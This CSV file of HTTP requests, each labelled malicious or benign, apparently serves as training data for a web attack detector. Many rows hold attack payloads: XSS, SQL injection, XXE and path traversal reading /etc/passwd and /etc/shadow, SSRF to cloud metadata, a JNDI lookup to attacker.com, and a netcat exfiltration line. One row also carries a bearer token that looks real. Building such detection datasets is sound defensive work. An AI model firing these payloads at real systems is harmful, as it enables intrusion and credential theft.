method,path,query,headers,body,ua,label
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,GET /docs/api/introduction,,,0
GET,/,,java\tscript:alert(1),,,1
GET,/admin,q=; ls -la,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,GET /search?q=security,,,0
GET,/,,<svg/onload=alert(1)>,,,1
GET,/favicon.ico,,,,,0
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/,,| id,,,1
DELETE,/index.php,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,Nikto/2.1.6,1
GET,/,,id=1; DROP TABLE users--,,,1
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/,,DELETE /api/v1/cart/items/5,,,0
GET,/,,POST /api/v1/orders (JSON payload),,,0
PUT,/login,,Host: example.com; Accept: */*,input=&& whoami,curl/7.68.0,1
GET,/,,GET /stream/audio/segment_77.aac,,,0
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,GET /static/css/style.css,,,0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
PUT,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"{""alg"":""none""}",,,1
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
DELETE,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
GET,/favicon.ico,,,,,0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,<body onload=alert(1)>,,,1
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/favicon.ico,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/favicon.ico,,,,,0
GET,/,,POST /newsletter/subscribe,,,0
GET,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,Host: evil.com,,,1
GET,/,,dict://localhost:11211/stat,,,1
GET,/plugins/servlet/svnwebclient/statsItem.jsp,url=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74",1
GET,/favicon.ico,,,,,0
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/favicon.ico,,,,,0
GET,/favicon.ico,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/favicon.ico,,,,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,Nikto/2.1.6,1
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,GET /search?q=O'Reilly,,,0
GET,/,,POST /register (detailed user info),,,0
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/web-api/orders/881ef23e-4027-4d15-b9d2-68d1d3732ab2,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzMwMDAxNTEiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiYTJkMWNkNjYtZDc0Yi00NDc1LTg5MzItNTRhM2RjOTNjMTRjIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzMwMDAxNTEiLCJzdWIiOiJXRUJTSVRFQDA3NzMwMDAxNTEiLCJpYXQiOjE3NzA2MzAzNjksImV4cCI6MTc3MTIzNTE2OX0._L_fuO0zdtiC_acWWmTKWtiP4RQraHupk_CEg60Hmx8; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: a4889e54-6cd8-416f-91f2-d5ef352e6beb",,python-requests/2.32.5,0
GET,/,,POST /graphql (query { me { name } }),,,0
GET,/favicon.ico,,,,,0
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,GET /user/profile,,,0
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
DELETE,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
DELETE,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,../../../../etc/passwd,,,1
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/api/v1/users,q=' OR 'x'='x,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/,,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/,,POST /newsletter/subscribe,,,0
GET,/,,GET /api/v1/products/101,,,0
GET,/,,url=http://malicious.com,,,1
GET,/,,url=http://malicious.com,,,1
GET,/,,//////////////////etc/passwd,,,1
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,`uname -a`,,,1
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,GET /docs/api/introduction,,,0
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
PUT,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/wp-content/plugins/hmapsprem/views/dashboard/index.php,p=/wp-content/plugins/hmapsprem/foo%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:78.0) Gecko/20100101 Firefox/78.0,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:78.0) Gecko/20100101 Firefox/78.0,1
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,id=1' OR '1'='1,,,1
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,"{""alg"":""none""}",,,1
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/,,GET /auth/logout/confirm,,,0
POST,/admin,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,sqlmap/1.5.2,1
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/favicon.ico,,,,,0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/login.jsp,nodeid=hebing%27%3E%3Csvg%20onload=alert(document.domain)%3E,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/14.0,,Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/14.0,1
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,dict://localhost:11211/stat,,,1
GET,/blog/articles/index.html,"reloaded&page=2"">%3Cscript%3Ealert(document.domain)%3c%2fscript%3E","Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",,"Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",1
PUT,/search,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,sqlmap/1.5.2,1
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,http://127.0.0.1:22,,,1
GET,/,,; cat /etc/passwd,,,1
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /robots.txt,,,0
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,http://127.0.0.1:22,,,1
GET,/,,id=1&id=2,,,1
GET,/,,http://169.254.169.254/latest/meta-data/,,,1
GET,/,,GET /favicon.ico,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /manifest.json,,,0
GET,/,,GET /feed/news.rss,,,0
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/favicon.ico,,,,,0
DELETE,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,POST /register (detailed user info),,,0
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,$(whoami),,,1
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,GET /user/profile,,,0
GET,/,,[Binary Frame] 0x89 (Ping),,,0
PUT,/blog/article-1,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
DELETE,/login,,Host: example.com; Accept: */*,input=' OR 'x'='x,curl/7.68.0,1
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,url=http://malicious.com,,,1
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,GET /search?q=security,,,0
GET,/,,GET /api/v1/ping,,,0
GET,/favicon.ico,,,,,0
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
POST,/home,,Host: example.com; Accept: */*,username=user712&password=pass560,Mozilla/5.0 (Linux; Android 11),0
GET,/,,GET /auth/google/callback,,,0
GET,/,,http://169.254.169.254/latest/meta-data/,,,1
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,GET /search?q=1+1=2,,,0
GET,/favicon.ico,,,,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,GET /api/v1/search/suggest?q=secur,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/main/calendar/agenda_list.php,"type=xss""+onmouseover=alert(document.domain)+""","Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-us) AppleWebKit/534.16+ (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-us) AppleWebKit/534.16+ (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",1
GET,/,,GET /api/v1/ping,,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,%0als,,,1
GET,/,,| id,,,1
GET,/ssl-vpn/getconfig.esp,client-type=1&protocol-version=p1&app-version=3.0.1-10&clientos=Linux&os-version=linux-64&hmac-algo=sha1%2Cmd5&enc-algo=aes-128-cbc%2Caes-256-cbc&authcookie=12cea70227d3aafbf25082fac1b6f51d&portal=us-vpn-gw-N&user=%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Eprompt%28%22XSS%22%29%3C%2Fscript%3E%3C%2Fsvg%3E&domain=%28empty_domain%29&computer=computer,"Accept-Encoding: gzip; Connection: close; Host: web.poc.vnshop.cloud; User-Agent: Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/104.0 Safari/537.36",,"Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/104.0 Safari/537.36",1
GET,/favicon.ico,,,,,0
GET,/,,GET /user/mfa/setup-qr,,,0
DELETE,/search,,Host: example.com; Accept: */*,input=; ls -la,curl/7.68.0,1
POST,/search,q=phone,Host: example.com; Accept: */*,username=user787&password=pass807,Mozilla/5.0 (Linux; Android 11),0
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,<body onload=alert(1)>,,,1
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
PUT,/index.php,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,Nmap Scripting Engine,1
GET,/favicon.ico,,,,,0
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,GET /blog/future-of-ai-2026,,,0
